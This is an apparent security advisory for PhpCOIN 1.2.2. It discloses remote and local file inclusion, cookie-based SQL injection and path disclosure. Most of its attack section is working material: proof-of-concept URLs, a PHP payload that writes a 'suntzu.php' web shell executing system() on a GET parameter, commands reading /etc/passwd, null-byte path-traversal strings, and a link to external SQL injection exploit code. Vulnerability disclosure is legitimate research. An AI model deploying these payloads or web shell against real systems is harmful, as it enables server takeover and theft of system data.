PhpCOIN 1.2.2 arbitrary remote\local inclusion / blind sql injection / path disclosure

software:
site: http://www.phpcoin.com/
description: "a free software package originally designed for web-hosting resellers
to handle clients, orders, invoices, notes and helpdesk, but no longer limited to
hosting resellers. phpCOIN is used by over twenty-five thousand people worldwide*,
including web-hosts, designers, lawyers, accountants, and a school band"

i) arbitrary remote/local inclusion:

vulnerable code in coin_includes/db.php at line 30-39:

...
# Determine Database and include proper class file
	switch($_DBCFG['dbms'])
	{
		case "mysql":
			require_once ($_CCFG['_PKG_PATH_DBSE'].'db_mysql.php');
			break;
		default:
			require_once ($_CCFG['_PKG_PATH_DBSE'].'db_mysql.php');
			break;
	}
...


if register_globals on and allow_url_fopen on
you can include an arbitrary file from a remote location, poc:

http://[target]/[path]/config.php?_CCFG[_PKG_PATH_DBSE]=http://[location]

on remote location you have this code in http:/[remote_location]/db_mysql.php/index.html:

<?php
$fp=fopen("suntzu.php","w");
fputs($fp,"<? echo 'Hi Master';error_reporting(0);ini_set('max_execution_time',0); system(\$HTTP_GET_VARS[cmd]);?>");
fclose($fp);
?>

then you launch commands:

http://[target]/[path]/suntzu.php?cmd=cat%20/etc/passwd

if register_globals on and magic_quotes_gpc off you can include an arbitrary file
from local resources, poc:

http://[target]/[path]/config.php?_CCFG[_PKG_PATH_DBSE]=../../../../../../../../etc/passwd%00
http://[target]/[path]/config.php?_CCFG[_PKG_PATH_DBSE]=../../../../../../../../script.php%00

ii) if magic_quotes_gpc off -> SQL injection through cookies:

exploit code here:
http://rgod.altervista.org/phpcoin_122_sql_xpl.html


iii) path disclosure, simply:

http://[target]/[path]/config.php

'cause in coin_includes/db.php _CCFG['_PKG_PATH_DBSE'] is not defined
